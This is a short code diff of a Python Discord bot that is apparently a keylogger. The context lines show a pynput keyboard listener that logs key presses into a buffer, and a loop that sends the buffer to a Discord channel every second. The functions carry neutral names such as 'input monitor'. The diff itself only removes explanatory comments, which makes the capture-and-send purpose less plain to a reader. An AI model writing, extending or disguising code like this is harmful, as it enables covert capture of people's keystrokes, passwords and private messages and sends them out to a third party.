@@ -48,7 +48,6 @@ async def process_data_queue(bot, CHANNEL_ID):
             await send_data_buffer(formatted_data, bot, CHANNEL_ID)
         await asyncio.sleep(1)
 
-# Send data to Discord
 async def send_data_buffer(data, bot, CHANNEL_ID):
     channel = bot.get_channel(CHANNEL_ID)
     if channel:
@@ -70,13 +69,11 @@ async def toggle_input_monitor(bot, CHANNEL_ID, input_monitor_active):
         start_input_monitor()
         asyncio.create_task(process_data_queue(bot, CHANNEL_ID))
 
-# Start the input monitor
 def start_input_monitor():
     global listener
     listener = Listener(on_press=log_input_event)
     listener.start()
 
-# Clear the buffer
 def clear_data():
     global buffer
     buffer = "" 
